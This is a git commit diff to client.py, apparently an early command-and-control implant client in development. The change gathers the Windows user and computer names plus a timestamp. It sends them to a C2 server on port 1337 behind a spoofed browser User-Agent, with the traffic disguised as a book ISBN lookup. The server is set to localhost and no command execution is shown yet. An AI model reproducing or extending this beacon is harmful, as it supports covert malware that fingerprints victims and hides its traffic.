5da0e543d824e14c49b111e1e6e5a55fbd42db7b
byt3scr1b3 <89225495+byt3scr1b3@users.noreply.github.com>
2024-03-04 08:21:58 +0100

    Update client.py

--- client.py
+++ client.py
@@ -1,13 +1,17 @@
+from os import getenv
+from time import time
+
 from requests import get
 
 HEADER = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                         "Chrome/120.0.0.0 Safari/537.36"}
 
-# Set a proxy
-# PROXY = {"https": "proxy:8081"}
 PROXY = None
 PORT = 1337
 C2_SERVER = "localhost"
+CMD_REQUEST = "/book?isbn="
 
-x = get(f"http://{C2_SERVER}:{PORT}", headers=HEADER, proxies=PROXY)
-print(x.headers)
+client = getenv("USERNAME") + "@" + getenv("COMPUTERNAME") + "@" + str(time())
+
+x = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
+print(x.status_code)
